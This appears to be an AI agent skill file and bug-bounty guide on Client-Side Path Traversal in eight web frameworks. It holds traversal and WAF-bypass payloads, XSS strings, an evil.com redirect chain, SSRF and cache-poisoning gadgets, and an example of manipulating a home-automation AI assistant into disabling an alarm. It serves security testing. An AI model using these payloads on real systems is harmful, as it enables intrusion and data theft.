---
name: cspt-xss
description: Client-Side Path Traversal — exploit CSR/SSR apps where URL parameters control fetch/XHR paths to inject cross-origin responses, achieve XSS, CSRF, or SSRF. Covers all 8 major frameworks with source-code-level decoding pipeline analysis, query param universality, secondary context (server-side) traversal, and per-framework XSS sinks. Use when any SPA/hybrid app fetches API data using URL-derived path segments.
---

# Client-Side Path Traversal (CSPT)

## Pattern

SPA and hybrid applications (React, Vue, Angular, Next.js, Nuxt, SvelteKit, Ember, SolidStart) that construct API fetch paths from URL parameters, hash fragments, or path segments. The fetch destination is attacker-controllable, enabling injection of arbitrary API responses into the rendering context (XSS), triggering state-changing operations (CSRF), or reaching internal services through server-side fetch (SSRF).

**Preconditions:**
- App fetches data using a URL-derived value (path param, query param, hash fragment)
- The fetch path is not validated or allowlisted on the client/server
- The injected response is rendered in a security-sensitive context (innerHTML or framework equivalent) OR hits a state-changing endpoint (CSRF) OR server-side fetch reaches internal services (SSRF)

## Injection Sources

Three sources feed attacker input into fetch paths. Their decode behavior differs:

| Source | Decode behavior | Segment boundary? | Encoding tricks needed? |
|---|---|---|---|
| Path params (`/settings/:userId`) | Framework-dependent (see matrix) | YES -- router splits on `/` first | Often yes (`%2F`, `%252F`) |
| Query params (`?id=value`) | **ALL frameworks decode** (universal) | NO -- entire value is one string | NO -- literal `../` works |
| Hash fragments (`#/path/value`) | Raw -- browser never encodes/decodes | NO | NO -- literal `../` works |

**Query params are the highest-value CSPT vector.** No segment splitting means no encoding tricks needed. Literal `../../../admin` lands as one decoded string in every framework. The browser does not normalize `../` in query strings. If you're only testing path params, you're missing the universal attack surface.

**Hash fragments are the simplest source.** `window.location.hash.slice(1)` returns exactly what was typed. No encoding, no decoding, no normalization. If a SPA reads the hash and interpolates it into a fetch URL, traversal works with zero encoding tricks.

## Quick Framework-to-Attack Map

Detected the framework? Use this to select your first payload:

```
React Router    -> 1. Query: ?param=../../admin  2. Path: %252F (uppercase F ONLY)  3. Splat routes: literal ../
Vue Router/Nuxt -> 1. Query: ?param=../../admin  2. Path: %2f   3. Nuxt server: check { decode: true }
Angular         -> 1. Query: ?param=../../admin  2. Path: %2f   3. queryParamMap -> router.navigate() = open redirect
Next.js         -> 1. Query: ?param=../../admin  2. Route handlers: %2f (pages are safe)  3. Secondary context SSRF
SvelteKit       -> 1. Query: ?param=../../admin  2. Path: %2f   3. +page.server.ts SSRF (bypasses hooks)
Ember           -> 1. Query: ?param=../../admin  2. Dynamic :param: %2f  3. Star *param: literal ../
SolidStart      -> 1. Query: ?param=../../admin  (path params are safe -- query is your only vector)
ALL + WAF       -> Add .%09./ (tab) or .%0a./ (LF) injection to bypass WAF pattern matching
```

**Always test query params first.** They decode in every framework, need no encoding tricks, and have no segment boundary constraints.

## Framework Decoding Matrix

Identify the framework during recon, then use this matrix to select your attack vector:

### Path Params: Does `%2F` Decode to `/`?

| Framework | Source API | `%2F` -> `/`? | `%2E%2E` -> `..`? | Double-encode `%252F`? | Null byte `%00`? | Decode function |
|---|---|---|---|---|---|---|
| **React Router v6** | `useParams()` | YES | YES | YES (uppercase F only) | YES (passes through) | `decodeURIComponent` + `.replace(/%2F/g, "/")` |
| **Next.js** (page/layout) | `useParams()` / `await params` | NO (re-encoded) | YES | NO | -- | `getParamValue()` re-encodes |
| **Next.js** (route handler) | `await params` | **YES** (auto-decoded) | YES | NO | -- | `getRouteMatcher()` -> `decode` |
| **Vue Router v4** | `route.params.*` | YES | YES | NO | YES | `decodeURIComponent` via `decodeParams()` |
| **Nuxt** (client) | `useRoute().params.*` | YES | YES | NO | YES | Inherits Vue Router `decodeParams()` |
| **Nuxt** (server) | `getRouterParam(event, 'id')` | NO | NO | NO | NO | Raw from radix3 (no decode default) |
| **Nuxt** (server + opt-in) | `getRouterParam(event, 'id', { decode: true })` | YES | YES | NO | YES | `decodeURIComponent` |
| **Angular** | `paramMap.get()` | YES | YES | NO | -- | `decodeURIComponent` via `decode()` |
| **SvelteKit** | `params.*` in load functions | YES | YES | NO (`%25`-split blocks) | -- | `decode_pathname()` + `decode_params()` |
| **Ember** (`:param`) | `params.*` in model hook | YES | YES | NO (`normalizePath` re-encodes `%`) | -- | `normalizePath()` + `findHandler()` -> `decodeURIComponent` |
| **Ember** (`*wildcard`) | `params.*` in model hook | NO (star skips final decode) | Partial | NO | -- | `normalizePath()` only |
| **SolidStart** | `useParams()` | **NO** | NO | NO | NO | None (raw from URL, never decodes) |

### Query Params: Decoded Everywhere (No Exceptions)

| Framework | Source API | Decoded? | Notes |
|---|---|---|---|
| React Router | `useSearchParams()` | YES | Standard `URLSearchParams` |
| Next.js | `useSearchParams()` / `searchParams` | YES | Standard `URLSearchParams` -- **this IS vulnerable even though path params are safe** |
| Vue Router | `route.query.*` | YES | Vue's `parseQuery()`, `+` stays literal (not space) |
| Nuxt (client) | `useRoute().query.*` | YES | Inherits Vue Router `parseQuery()` |
| Nuxt (server) | `getQuery(event)` | YES | `ufo` library decodes |
| Angular | `queryParamMap.get()` | YES | `decodeQuery()` -> `decodeURIComponent`, no segment boundary |
| SvelteKit | `url.searchParams` / `$page.url.searchParams` | YES | Standard `URLSearchParams` |
| Ember | Query params in model hook | YES | Browser-decoded |
| SolidStart | `useSearchParams()` | YES | **Primary CSPT vector** since path params are safe |

### Safe Sources Per Framework (What Won't Betray You)

| Framework | Safe source | Why |
|---|---|---|
| React Router | `useLocation().pathname` | Preserves `%2F` encoding |
| Next.js | `useParams()` / page `await params` | `getParamValue()` re-encodes `%2F` |
| Vue Router | `route.path`, `route.fullPath` | Preserves `%2F` encoding |
| Nuxt (client) | `route.path`, `route.fullPath` | Inherits Vue Router encoding preservation |
| Nuxt (server) | `getRouterParam()` without `{ decode: true }` | Raw from radix3, no decode |
| Angular | `router.url` | Preserves `%2F` encoding |
| SvelteKit | Param matchers (`[id=id]`) | Rejects non-matching values at route level |
| Ember | `window.location.pathname` | Raw browser value, bypasses route-recognizer |
| SolidStart | `useParams()` (single-segment dynamic) | Router never calls `decodeURIComponent` |

## Framework Deep-Dive

### React Router (v6+) -- HIGH RISK

**Pipeline:**
```
Browser URL (percent-encoded)
    -> decodePath()        -- per-segment decodeURIComponent, re-encodes / back to %2F
    -> compilePath()       -- builds regex for route matching
    -> matchPath()         -- extracts param values, runs .replace(/%2F/g, "/") -- NO `i` flag
    -> useParams()         -- returns fully decoded params to developer code
```

**Key details:**
- `decodePath()` (line 863) is an anti-CSPT defense: decodes segments then re-encodes slashes. But `matchPath()` (line 811) undoes it with `.replace(/%2F/g, "/")` -- uppercase F only, no `i` flag
- Double-decode still works via a different mechanism than the original bug (Issue #10814): `decodePath()` runs `decodeURIComponent("%252F")` -> `"%2F"`, then line 811's regex converts that to `/`. Decode + string replace = same outcome
- `%252F` (uppercase F) -> traversal succeeds. `%252f` (lowercase f) -> traversal fails
- **Splat routes** (`path="files/*"`) are the most dangerous: `params["*"]` uses `(.*)` regex instead of `([^\\/]+)`, captures across `/` boundaries with NO encoding tricks needed. Literal `../../admin` works.
- Overlong UTF-8 (`%C0%AF`) and Unicode homoglyphs do NOT work -- `decodeURIComponent` rejects invalid UTF-8, no NFKC normalization

**Test payloads (path params):**
```
/users/%2E%2E%2F%2E%2E%2Fadmin         -- standard (single decode)
/users/..%252F..%252Fadmin              -- double-encode (uppercase F ONLY)
/users/hello%00world                    -- null byte injection
/files/../../admin                      -- splat route (no encoding needed)
```

**Remember:** Even if path params fail, `?widget=../../admin` works via `useSearchParams()` -- always test both.

### Next.js (App Router) -- SPLIT BEHAVIOR (Critical Nuance)

**The same `await params` API behaves differently depending on context:**

| Context | `%2F` in URL | What `await params` returns | CSPT? |
|---|---|---|---|
| Page server component | `/files/a%2Fb` | `["a%2Fb"]` (re-encoded) | **Safe** |
| Route handler (`/api/...`) | `/api/content/a%2Fb` | `["a", "b"]` (decoded to `/`) | **Exploitable** |
| `useParams()` (client) | `/files/a%2Fb` | `"a%2Fb"` (re-encoded) | **Safe** |

**The attack chain exploiting this split:**
```
1. Attacker: /cspt-test/docs/getting-started/..%2F..%2Finternal%2Fcredentials

2. Page server component reads await params:
   path = ["docs", "getting-started", "..%2F..%2Finternal%2Fcredentials"]
   // Re-encoded. Safe at this layer.

3. Page joins and passes to client component:
   filePath = "docs/getting-started/..%2F..%2Finternal%2Fcredentials"

4. Client component fetches:
   fetch(`/api/content/${filePath}`)

5. Route handler reads await params:
   path = ["docs", "getting-started", "..", "..", "internal", "credentials"]
   // DECODED. %2F became / and split into separate array elements.

6. Route handler joins: path.join("/") -> "docs/getting-started/../../internal/credentials"
   // Secondary context path traversal is live
```

This is NOT client-side path traversal -- it's **secondary context path traversal**. The encoded path hits the server, which decodes it and passes the decoded value into a backend fetch. Higher impact because the server often has access to internal resources.

**Query params are still fully decoded** via standard `URLSearchParams`, making them the primary client-side CSPT vector on Next.js targets even when path params are safe. Test `?param=../../admin` on every Next.js target.

### Vue Router v4 / Nuxt -- HIGH RISK (Prioritize for Hunting)

Vue Router maintains two views of every URL with opposite encoding:
```javascript
const route = useRoute();
// URL: /product/..%2f..%2fadmin
route.params.productId;  // "../../admin"           (DECODED, slashes are real)
route.path;              // "/product/..%2f..%2fadmin"  (ENCODED, raw)
```

**Key details:**
- `decodeParams()` applies `decodeURIComponent()` unconditionally -- no opt-out
- `router.push()` encoding asymmetry: string path passes through as-is (traversal resolves), params object auto-encodes via `encodeParams()` (safe at navigation level but still decodes back in `route.params`)
- Catch-all routes (`/:pathMatch(.*)*`) return an array. `%2F` decodes to `/` inside a single array element, not as a separator. `.join('/')` produces the same traversal string either way
- **Most exploitable param-to-fetch pipeline of any framework** -- direct interpolation into `useFetch()` or `$fetch()` with zero sanitization

**Nuxt server-side specifics:**
- `getRouterParam(event, 'id')` does NOT decode by default (safe)
- `getRouterParam(event, 'id', { decode: true })` -- opt-in that makes it exploitable. H3 docs show examples with decode enabled
- **CVE-2025-59414**: Nuxt island component payload revival. `revive-payload.client.js` deserializes `window.__NUXT__` and fetches `$fetch("/__nuxt_island/${key}.json")`. If attacker poisons the payload (cache poisoning, stored injection), the key can traverse: `key = "../../api/proxy/attacker.com?x="` produces `/__nuxt_island/../../api/proxy/attacker.com?x=.json` -> `/api/proxy/attacker.com?x=.json`. **Stored CSPT** -- set once, fires for every client.
- Multi-param routes double the attack surface: `/shop/..%2F..%2Fadmin/..%2Fusers` gives two decoded params, each contributing traversal

### Angular -- HIGH RISK

**Key details:**
- `SEGMENT_RE = /^[^\/()?;#]+/` matches path segments -- treats `%2F` as three literal characters, so `%2F` stays in a single segment during route matching. Then `decode()` runs `decodeURIComponent()` AFTER matching but BEFORE `paramMap`. Developers see fully decoded values
- **More exploitable than React or Vue for `%2F`-based CSPT on regular dynamic params** -- in those frameworks, `%2F` can break route matching and return 404. In Angular, the route matches AND the developer gets the decoded slash
- `router.navigate()` re-encoding differential: passing decoded query param values to `router.navigate()` double-encodes them (`%` -> `%25`). This creates an **open redirect** vector: `queryParamMap.get('redirect')` returns decoded value, `router.navigate([redirect])` treats it as navigation target
- `**` wildcard route does NOT capture sub-paths in a named param (safer than React's splat). But manual URL parsing with `decodeURIComponent()` immediately re-introduces the vuln
- Query params via `decodeQuery()` have NO segment boundary -- entire `../../api/internal/users` lands as one decoded string

### SvelteKit -- HIGH RISK (Corrected from Previous Assessment)

**Two-stage decode pipeline:**
```
Browser URL (percent-encoded)
    -> decode_pathname()   -- splits on %25, applies decodeURI() per segment
    -> Route regex match   -- ([^/]+?) for single params, ([^]*) for catch-all
    -> decode_params()     -- applies decodeURIComponent() to each param value
    -> params.userId       -- fully decoded, slashes are real
```

`%2F` stays as `%2F` during route matching (because `decodeURI()` does NOT decode `/`). The regex `([^/]+?)` sees three characters `%`, `2`, `F`. Route matches. Then `decode_params()` runs `decodeURIComponent()` and `%2F` becomes `/`. **Traversal lands.**

**Double-encode defense:** `decode_pathname()` splits on `%25` (encoded `%`) before decoding, preventing `%252F` from round-tripping to `/`. This was a fix for Issue #3069.

**Server-side escalation:** `+page.server.ts` load functions execute with internal network access. Fetch goes directly to internal services and does NOT pass through `hooks.server.ts`. Auth middleware in hooks is bypassed entirely:
```typescript
// +page.server.ts -- SSRF via secondary context traversal
export const load = async ({ params }) => {
  const dataId = params.dataId; // decoded, traversal arrives here
  const doc = await fetch(`http://internal-service.local/data/${dataId}`);
  return { data: await doc.json() };
};
```

**Param matchers are the strongest defense of any framework:**
```typescript
// src/params/id.ts
export function match(param: string): boolean {
  return /^[a-zA-Z0-9-_]+$/.test(param);
}
```
If param doesn't match, the entire route fails before any load function runs. Opt-in, not default.

### Ember -- HIGH RISK (Dynamic Params) / MEDIUM (Wildcards)

**Unique `normalizePath()` pipeline:**
```javascript
// route-recognizer.es.js:100
function normalizeSegment(segment) {
  if (segment.length < 3 || segment.indexOf("%") === -1) return segment;
  return decodeURIComponent(segment).replace(/%|\//g, encodeURIComponent);
}
```
Splits on `/`, decodes each segment, then re-encodes only `%` and `/`. Dots decode and stay (`%2e%2e` -> `..`), slashes decode and get re-encoded (`%2f` -> `%2F`). Then `findHandler()` applies `decodeURIComponent()` again on dynamic params, producing the final decoded value with real slashes.

**Critical bifurcation:**
- Dynamic `:param` segments: `shouldDecodes[j] = true`, final `decodeURIComponent` runs. `%2f` becomes `/`. Traversal works.
- Star `*param` segments: `shouldDecodes[j] = false`, final decode skipped. `%2f` stays encoded. BUT literal `../` works because `(.+)` regex captures across `/` boundaries.

**Double-encode does NOT work** -- `normalizePath()`'s `%` re-encoding accidentally prevents it: `%252f` -> decode to `%2f` -> re-encode `%` to `%25` -> back to `%252f`. Idempotent.

**Ember Data adapter as indirect sink:**
```javascript
urlForFindRecord(id, modelName) {
  return `/api/${modelName}s/${id}`;  // No encodeURIComponent
}
```
When `this.store.findRecord('user', params.user_id)` is called, the decoded param flows through the adapter URL builder. Developer never calls `fetch()` directly -- the framework's data layer does it.

**XSS via triple-curly `{{{value}}}` or `htmlSafe()`** -- compiles to `insertAdjacentHTML('beforeend', html)`.

### SolidStart -- LOW RISK (Path Params) / HIGH RISK (Query Params)

**The one framework that got it right by accident.** `@solidjs/router`'s `createMatcher()` stores raw URL segments as-is into params. No `decodeURIComponent` call anywhere in the routing/param extraction pipeline. `%2f` stays `%2f`.

**Primary attack vector is query params:** `useSearchParams()` uses standard `URLSearchParams` which auto-decodes. This is the entire CSPT surface.

**Server function passthrough:** `query("use server")` serializes arguments via seroval and sends as POST to `/_server`. Server deserializes the exact string. No re-encoding, no sanitization at transport boundary. If input came from a decoded search param, the traversal string passes through unchanged to server-side fetch:
```javascript
const getData = query(async (dataId: string) => {
  "use server";
  const res = await fetch(`http://internal-service.local/data/${dataId}`);
  return res.json();
}, "getData");
```

**XSS sink:** Solid's native `innerHTML` prop is a first-class JSX attribute (less verbose than React's `dangerouslySetInnerHTML`): `<div innerHTML={stats()} />`

## URL Normalization: fetch() vs XHR vs Browsers

### Browser Path Normalization

The browser resolves `../` in the URL path BEFORE sending the request. `https://target.com/path/../second` becomes `https://target.com/second` on the wire. This is per the URL specification. **This does NOT happen in query strings or hash fragments** -- `?q=../admin` is sent as-is.

Backslash is normalized to forward slash by the browser: `https://target.com\path` becomes `https://target.com/path`.

URL encoding bypasses path normalization: `https://target.com/path/%2E%2E/second` is sent as-is because `%2E` is not treated as `.` by the browser's path resolver.

### WHATWG URL Parser Tab/Newline Stripping

The WHATWG URL spec (used by `fetch()`, `new URL()`, and browser navigation) strips three characters during URL parsing:

**Stripped characters:** U+0009 (tab), U+000A (line feed), U+000D (carriage return)

**When:** Step 3 of the basic URL parser -- after trimming leading/trailing control chars, before the state machine processes the URL.

**The WAF bypass chain:**
```
Victim URL:  https://app.com/page/..%09%2Fadmin
                                     ^^
                                     tab (percent-encoded in victim URL)

Step 1: WAF inspects victim URL
        Sees: ..%09%2Fadmin -- no ../ pattern match -> PASSES

Step 2: Browser decodes victim URL for page navigation
        SPA router extracts param: "..\t/admin" (literal tab)

Step 3: App constructs fetch URL: fetch("/api/" + param)
        Input to fetch(): "/api/..\t/admin"

Step 4: WHATWG parser strips literal tab
        Parsed URL: "/api/../admin"

Step 5: Path resolution: "/admin"
        Request sent: GET /admin
```

**Key insight:** Stripping applies to **literal** characters, not percent-encoded forms. The bypass works because `%09` in the victim URL is decoded to a literal tab by the browser, then stripped by fetch()'s URL parser. The WAF only sees the percent-encoded form.

**Payload permutations** (in victim URL -- all normalize to `../` after browser decode + WHATWG strip):
```
.%09./    .%0a./    .%0d./              single char variants
.%09.%09/ ..%0d%0a/ .%09%0a./          multi-char combos
%2e%09%2e%2f  %2e%09%2e/  .%09.%5c    mixed with other encoding
%2F%2e%09%2e%5C                        xssdoctor's go-to WAF bypass (slash + tab-dotdot + backslash)
```

**xssdoctor's WAF bypass: `%2F%2e%09%2e%5C`** -- combines forward slash, tab-injected dots, AND backslash in one payload. WAFs pattern-matching on `..`, `%2e%2e`, `../`, or `..%2f` all miss it. The tab is stripped by fetch()'s WHATWG parser, the backslash normalizes to forward slash, and the dots resolve as `..`. Test this first on WAF-protected targets.

### fetch() vs XMLHttpRequest

| Behavior | fetch() | XMLHttpRequest |
|---|---|---|
| URL parser | WHATWG (strips literal tabs/newlines) | WHATWG (same stripping) |
| Redirect handling | `redirect: "follow"` (default), `"manual"`, `"error"` | Follows transparently (no control) |
| Cross-origin redirects | Taints response (opaque unless CORS) | Blocked unless CORS |

**Axios** defaults to XHR in browsers (not fetch). Can be configured with fetch adapter via `adapter: "fetch"`. Server-side Axios (Node) uses `http` module with different URL handling.

**Neither fetch() nor XHR execute JSONP responses.** Axios's `transformResponse` runs `JSON.parse()` which silently fails on JSONP format and returns the raw string. The JSONP gadget works because the **SPA renders the raw response text** as HTML.

## Probe

### 1. Identify Client-Side Fetch Path Construction

Search for patterns where URL input flows into fetch/XHR paths:

```javascript
// Vulnerable patterns -- URL-derived values in fetch paths
fetch(`/api/page/${pageId}`)                    // pageId from useParams()
fetch(`/api/content?slug=${params.slug}`)       // slug from route params
axios.get(`/api/v1/${resource}/${id}`)          // resource + id from URL
$.get(`/data/${window.location.hash.slice(1)}`) // hash fragment
```

**Detection with jxscout:**
```bash
jxscout-pro-v2 -c get-matches --kind fetch-url-injection
jxscout-pro-v2 -c get-matches --kind dynamic-api-path
```

**Manual grep patterns:**
```bash
# In downloaded JS bundles
rg 'fetch\s*\(`[^`]*\$\{' --type js
rg 'axios\.(get|post|put)\s*\(`[^`]*\$\{' --type js
rg '\.get\s*\([^)]*location\.' --type js
rg 'useParams|useSearchParams|this\.\$route\.params' --type js
rg 'useFetch|\\$fetch|\$fetch' --type js           # Nuxt-specific
rg 'createResource|createAsync' --type js           # SolidStart-specific
rg 'this\.store\.findRecord' --type js              # Ember Data adapter sink
rg 'paramMap\.get|queryParamMap\.get' --type js     # Angular
```

### 2. Black-Box Detection (No Source Required)

```
1. Find pages with dynamic paths:    /settings/username, /profile/12345
2. Replace dynamic segment:          /settings/booyakasha
3. Check proxy for API calls containing "booyakasha"
4. If reflected in API path -> CSPT candidate
5. Test traversal per framework:
   - React:     /settings/booyakasha%252F../admin  (uppercase F)
   - Vue/Nuxt:  /settings/booyakasha%2f../admin
   - Angular:   /settings/booyakasha%2f../admin
   - SvelteKit: /settings/booyakasha%2f../admin
   - Next.js:   Test query params: /settings?id=../../admin
   - SolidStart: Test query params: /settings?id=../../admin
6. Check if API path changes -> confirmed source-to-sink
7. Assess impact: DOM insertion (XSS), state-change (CSRF), or server fetch (SSRF)
```

**Always test query params too**, even if path params don't decode. Navigate to `/dashboard/stats?widget=../../attachments/test` and check proxy for the traversed API call. This works on ALL frameworks.

**Confirm HTML injection:** Use Caido match-and-replace to inject `<img src=x>` into the API response body. If the SPA renders the image, the sink is confirmed.

### 3. Encoding Bypass Matrix

Test in order -- stop at first success, then try tab-stripping for WAF-protected targets:

| Encoding | Payload | Decoded by | Works against | Framework notes |
|---|---|---|---|---|
| Literal | `../` | -- | No filtering | Works in query params, hash, splat/catch-all routes |
| URL-encoded slash | `..%2F` | Browser/router | Basic string filter on `../` | Vue, Angular, SvelteKit, Ember (`:param`) |
| URL-encoded dots | `%2e%2e/` | Browser/router | Filter on `..` | All decoding frameworks |
| Full URL encoding | `%2e%2e%2f` | Browser/router | Filter on `../` and `..` | All decoding frameworks |
| Double encoding | `..%252F` | React Router only | Single-decode filters | **React only** (uppercase F). Blocked in: Ember (`%` re-encode), SvelteKit (`%25`-split) |
| Case-sensitive | `..%252F` vs `..%252f` | React Router regex | React -- uppercase F ONLY | `.replace(/%2F/g, "/")` has no `i` flag |
| Tab injection | `.%09./` | WHATWG parser strips tab | WAF pattern matching | Works at fetch() layer regardless of framework |
| Newline injection | `.%0a./` | WHATWG parser strips LF | WAF pattern matching | Same as tab |
| CRLF injection | `.%0d%0a./` | WHATWG parser strips CRLF | WAF pattern matching | Same as tab |
| Mixed tab+encoding | `%2e%09%2e%2f` | WHATWG strip + URL decode | WAF + string filters | Combine with any framework's decode |
| Backslash | `..%5c` | Windows/some parsers | Slash-only filters | Browser normalizes `\` to `/` in path |
| Semicolon | `..;/` | Tomcat/Spring | Proxy-layer filters | Backend-specific |
| Null byte | `..%00../` | Some frameworks | Filter truncation | React Router passes through, test others |
| Overlong UTF-8 | `..%c0%af` | -- | -- | **Does NOT work** -- `decodeURIComponent` rejects invalid UTF-8 in all tested frameworks |
| Unicode homoglyphs | `..／admin` | -- | -- | **Does NOT work** -- no NFKC normalization in any tested framework |

## XSS Sinks Per Framework

When CSPT redirects a fetch to an attacker-controlled endpoint that returns HTML, the response must flow into one of these sinks for XSS:

| Framework | Dangerous render | Syntax | Compiles to |
|---|---|---|---|
| React / Next.js | `dangerouslySetInnerHTML` | `<div dangerouslySetInnerHTML= />` | `element.innerHTML = val` |
| Vue / Nuxt | `v-html` | `<div v-html="val" />` | `element.innerHTML = val` |
| Angular | `[innerHTML]` + `bypassSecurityTrustHtml()` | `<div [innerHTML]="val">` | `element.innerHTML = val` (bypasses sanitizer) |
| SvelteKit | `{@html}` | `{@html val}` | `element.innerHTML = val` |
| Ember | Triple curlies / `htmlSafe()` | `{{{value}}}` | `insertAdjacentHTML('beforeend', val)` |
| SolidStart | `innerHTML` | `<div innerHTML={val} />` | `element.innerHTML = val` |

**Grep for sinks in JS bundles:**
```bash
# Framework-specific unsafe render directives
rg 'dangerouslySetInnerHTML|v-html|bypassSecurityTrustHtml|\{@html|\{\{\{|htmlSafe\(' --type js
# Direct innerHTML assignment (catches all frameworks including SolidStart)
rg '\.innerHTML\s*=' --type js
```

## Secondary Context Path Traversal (Server-Side -> SSRF)

Hybrid frameworks create a second, higher-impact attack surface when server components pass decoded params into internal `fetch()` calls. The server often has access to internal services unreachable from the client.

| Framework | Server sink | Params decoded? | Bypasses auth middleware? | Risk |
|---|---|---|---|---|
| Next.js | Route handler `await params` -> `fetch()` | YES (auto-decoded, no opt-in) | Depends on middleware config | SSRF to internal services |
| Nuxt | `getRouterParam(event, 'id', { decode: true })` -> `$fetch()` | YES (opt-in) | Depends | SSRF to internal services |
| SvelteKit | `+page.server.ts` / `+server.ts` params -> `fetch()` | YES (`decode_params()`) | **YES** -- bypasses `hooks.server.ts` | SSRF, auth bypass |
| SolidStart | `query("use server")` args -> `fetch()` | Passthrough (exact client string) | Depends | SSRF if input already decoded |

**Detection oracle for secondary context traversal:**
- 500 error on invalid traversal -> server attempted path resolution
- 200 with unexpected response body -> traversal resolved to different endpoint
- Timing differential -> server-side fetch to internal host (slower/faster than normal)

## Exploitation Gadgets

### Gadget 1: File Upload + CSPT = Stored XSS

```
1. Upload file with XSS payload in metadata:
   POST /api/files/upload
   filename="<img src=x onerror=alert(document.cookie)>.png"

2. Note the file ID: {"id": "abc123", "filename": "<img src=x onerror=...>"}

3. CSPT to fetch file metadata:
   https://app.com/view?page=../../api/files/abc123

4. SPA fetches /api/files/abc123, renders filename via innerHTML/v-html/{@html} -> XSS
```

### Gadget 2: JSONP Endpoint

Same-origin or CDN JSONP endpoints become XSS sinks via CSPT:

```
# JSONP endpoint returns: <img src=x onerror=alert(1)>({"data": "..."})
# SPA dumps raw response into innerHTML -> callback name renders as HTML

https://app.com/view?page=../../jsonp?callback=<img src=x onerror=alert(1)>
```

**Why this works:** Neither fetch() nor Axios execute JSONP callbacks. The response is a raw string. The SPA renders it via innerHTML -- the attacker-controlled callback name becomes HTML.

### Gadget 3: Open Redirect + Cross-Origin Response

```
# Open redirect on same origin -> attacker-controlled JSON
https://app.com/view?page=../../redirect?url=https://evil.com/xss.json
```

**Constraints:** Cross-origin fetches return opaque responses unless CORS allows it or redirect stays same-origin.

### Gadget 4: State-Changing Endpoints (CSPT-to-CSRF)

CSPT to a state-changing endpoint. Even POST-based APIs may be vulnerable if the SPA sends the traversed path as a POST with attacker-controlled body.

### Gadget 5: Nuxt Island Payload Poisoning (CVE-2025-59414)

**Stored CSPT unique to Nuxt.** `revive-payload.client.js` fetches island data:
```javascript
nuxtApp.payload.data[key] ||= $fetch(`/__nuxt_island/${key}.json`, { responseType: "json" });
```

If attacker poisons `window.__NUXT__` payload (via cache poisoning, stored injection, or MITM), the key traverses:
```
key = "../../api/proxy/attacker.com?x="
$fetch("/__nuxt_island/../../api/proxy/attacker.com?x=.json")
Resolves to: /api/proxy/attacker.com?x=.json
```
Set once, fires for every client that loads the page.

**Detection:** View page source, search for `window.__NUXT__` or `<script id="__NUXT_DATA__"`. If present, the island payload system is active. Check if the response is cached by CDN (varies by `Cache-Control`, `x-cache` headers). If cached, cache poisoning can inject a traversed key that persists for all visitors.

### Gadget 6: Ember Data Adapter (Indirect CSPT)

Ember Data's `urlForFindRecord(id, modelName)` builds fetch URLs from model names and IDs without encoding. When `this.store.findRecord('user', params.user_id)` is called with a decoded traversal param, the framework's data layer makes the traversed fetch -- developer never calls `fetch()` directly.

### Gadget 7: Pre-Production File Upload XSS

Production endpoints typically set `Content-Disposition: attachment` on uploaded files, preventing inline rendering. **Staging/pre-prod endpoints often lack this header**, serving uploads inline instead. Combined with CSPT:

```
1. Find a staging/pre-prod subdomain (dev.target.com, staging.target.com)
2. Upload HTML file with XSS payload to the staging upload endpoint
3. Confirm the file renders inline (no Content-Disposition: attachment header)
4. Use CSPT on the main app to traverse to the staging upload path
5. SPA fetches and renders the attacker's HTML -> XSS
```

This was used by xssdoctor to chain with a postMessage listener on a home automation AI assistant -- the XSS sent a postMessage that made the AI disable the alarm system (Critical impact).

**When testing file uploads for XSS escalation, always check pre-production/staging endpoints for missing `Content-Disposition: attachment`.**

### Gadget 8: PostMessage + CSPT Chain

If the target has a postMessage listener that accepts messages from `*.target.com`:

```
1. Achieve XSS on any subdomain via CSPT + file upload (or other gadget)
2. The XSS payload sends postMessage to the main app's listener
3. The listener executes the attacker's command (e.g., state change, data exfil)
```

If the target also has CORS `Access-Control-Allow-Origin: *.target.com` with credentials, the XSS can hit the API directly without needing the postMessage gadget.

### Gadget 9: Angular Open Redirect via router.navigate()

When developers pass decoded `queryParamMap` values to `router.navigate()`:
```typescript
const redirect = this.route.snapshot.queryParamMap.get('redirect');
// redirect = "../../admin" (decoded)
this.router.navigate([redirect]);
// Navigates to /admin -- open redirect
```
`router.navigate()` treats the value as a navigation target. The traversal doesn't happen through navigate's re-encoding -- it happens because the decoded value IS the destination.

## CDN/CloudFront CORS Cache Consideration

If CDN caches API responses and the first request had no `Origin` header, the cached response lacks CORS headers. Subsequent cross-origin fetches get blocked.

**Workaround:** CSPT is strongest when traversal stays same-origin. Prefer same-origin gadgets (file upload, JSONP, state-change endpoints) over cross-origin chains.

## Severity Escalation

| CSPT chain | Impact | Severity |
|---|---|---|
| Traverse to read-only API | Info disclosure | Medium |
| + File upload with payload in metadata | Stored XSS | High |
| + JSONP endpoint with callback injection | Reflected XSS | High |
| + Open redirect to attacker JSON (CORS allows) | Reflected XSS | High |
| + State-changing endpoint | CSRF-equivalent | High-Critical |
| + Admin/privileged endpoint | Privilege escalation | Critical |
| + postMessage listener on target origin | XSS chain | Critical |
| + Pre-prod file upload (inline rendering) + CSPT | Stored XSS | High |
| + Pre-prod XSS + postMessage + CORS wildcard subdomain | Full account/device takeover | Critical |
| + Server-side fetch to internal services (secondary context) | SSRF | High-Critical |
| + Nuxt island payload poisoning | Stored CSPT -> Stored XSS | Critical |

## Detection Checklist

- [ ] Identify framework (React/Vue/Angular/Next/Svelte/Nuxt/Ember/SolidStart)
- [ ] Test **query params first** -- universal vector, no encoding tricks needed
- [ ] Test path params with framework-appropriate encoding (see matrix)
- [ ] Test hash fragment if SPA reads `window.location.hash`
- [ ] Test both `%2F` and `%2f` on React Router (case sensitivity)
- [ ] Test `%252F` (uppercase F only) on React Router (double-decode)
- [ ] Test tab/newline injection (`.%09./`) for WAF-protected targets
- [ ] Check proxy for API path changes confirming source-to-sink
- [ ] Identify XSS sinks: grep for framework's innerHTML equivalent
- [ ] Check for same-origin file upload with user-controlled metadata
- [ ] Check for same-origin JSONP endpoints
- [ ] Check for same-origin open redirect
- [ ] Check for state-changing endpoints reachable via traversal
- [ ] Test secondary context (server-side) traversal on hybrid frameworks
- [ ] On Next.js: test route handlers specifically (different decode than pages)
- [ ] On SvelteKit: check if `+page.server.ts` fetches internal services
- [ ] On Nuxt: check for island components and `__NUXT__` payload injection
- [ ] On Ember: check for `{{{triple curlies}}}` and `htmlSafe()` usage
- [ ] On Angular: test `queryParamMap` -> `router.navigate()` for open redirect

## Chain With

- self-xss-escalation -- CSPT as the XSS primitive in escalation chains
- web-cache-deception-path -- cache the CSPT-triggered response for persistence
- csp-bypass -- if CSP blocks inline scripts, combine CSPT with JSONP/CDN gadgets
- dom-vulnerability-detection -- trace source-to-sink for the fetch path
- unicode-normalization-bypass -- NFKC normalization may decode traversal chars post-filter
